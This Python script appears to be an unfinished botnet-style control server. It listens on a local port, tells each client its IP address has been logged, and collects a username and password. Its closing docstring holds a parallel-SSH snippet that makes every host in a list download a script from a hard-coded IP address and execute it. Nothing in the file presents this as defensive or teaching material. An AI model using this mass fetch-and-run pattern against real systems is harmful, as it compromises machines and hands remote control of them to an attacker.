import os
import sys
import socket
import getpass
import threading
from pssh.pssh2_client import ParallelSSHClient

user = getpass.getuser()

syntax_prefix = "*"

class puts:

    @staticmethod
    def err(string):
        sys.stderr.write(string + "\n")

    @staticmethod
    def out(string):
        sys.stdout.write(string + "\n")


def client(conn, addr):
    try:
        conn.send("Your IP Address: \033[32m{} \033[0mHas been logged. \r\n\033[31mEverything you do  will be logged.\r\n".format(addr[0]))
        puts.out("     - prompting client with login")
        conn.send("\033[0mu\033[31ms\033[32me\033[1;36mr\033[35mn\033[37ma\033[31mm\033[33me\033[0m: ")
        username = conn.recv(4096)
        blank = conn.recv(1024)
        conn.send("\033[0mp\033[31ma\033[32ms\033[1;36ms\033[35mw\033[37mo\033[31mr\033[33md\033[0m: ")
        password = conn.recv(4096)
        blank = conn.recv(1024)

        

    except Exception:
        puts.err("     - unknown error occured with client. closing socket to client")
        conn.send("\033[31m an error has occured. closing")
        conn.close()
        




def server():
    sock = socket.socket()

    try:
        sock.bind(("127.0.0.1", 3332))
    except socket.error:
        puts.err("[-] Socket Error: Failed to bind to address, Address already in use.")

    sock.listen(0)
    while True: # creating infinite while loop to run forever until error
        try:
            conn, addr = sock.accept()
            puts.out("[+] Connection Recieved. Forwarding client to shell. {}:{}".format(addr[0], addr[1]))
            try:
                threading.Thread(target=client, args=(conn, addr,)).start()
            except Exception:
                puts.err("     - could not send client. error occured.")
            
            puts.out("     - sent client to shell.")
            

        except socket.error as e:
            puts.err("[-] Socket Error: Unknown error occured\n%s" + str(e))


server()
"""
    Config
    hosts.append(line)
    client = ParallelSSHClient(hosts)
    output = client.run_command("wget http://45.76.0.246/setup.sh; chmod +x setup.sh; ./setup.sh")
"""
